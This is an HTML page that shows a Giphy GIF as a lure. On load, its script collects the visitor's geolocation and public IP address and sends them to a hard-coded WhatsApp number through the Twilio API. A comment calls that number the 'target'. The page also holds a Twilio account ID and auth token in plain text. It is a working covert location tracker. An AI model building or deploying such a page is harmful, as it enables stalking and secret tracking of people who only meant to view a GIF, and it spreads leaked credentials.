<!DOCTYPE html>
<html>
<body onload="getLocation()">
<iframe src="https://giphy.com/embed/NWg7M1VlT101W" width="480" height="269" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/disney-bored-tired-NWg7M1VlT101W"></a></p>

<script>

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(handleSuccess, handleError);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

async function getIp(location) {
  try{
    const response= await fetch('https://api.ipify.org?format=json');
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    const data = await response.json();
    const ip = data.ip;
    const ipLocation = "IP Address: " + ip + "<br>" + location;
    console.log(ipLocation);
    sendLocation(ipLocation);
  }catch(error){
    let err='"Error fetching IP address:"'
    console.error(err, error);
    sendLocation(err + error);
  }
}

function handleSuccess(position) {
  const location = "Latitude: " + position.coords.latitude + 
    "<br>Longitude: " + position.coords.longitude;
    getIp(location)
  sendLocation(location);
}

function handleError() {
  const errorMsg = "Sorry, no position available.";
  alert(errorMsg);
  sendLocation(errorMsg);
}

function sendLocation(message) {
  const accountSid = 'ACa19fba622d6c5fe27c95c975015c1109';
  const authToken = 'a3133adbba7e282cefd53311172df692';
  const twilioNumber = 'whatsapp:+14155238886'; // Twilio sandbox number
  const recipientNumber = 'whatsapp:+254710745780'; // Your target number

  fetch(`https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`, {
    method: 'POST',
    headers: {
      'Authorization': 'Basic ' + btoa(`${accountSid}:${authToken}`),
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
      From: twilioNumber,
      To: recipientNumber,
      Body: message
    })
  })
  .then(response => response.json())
  .catch(error => console.error('Error:', error));
}
</script>

</body>
</html>
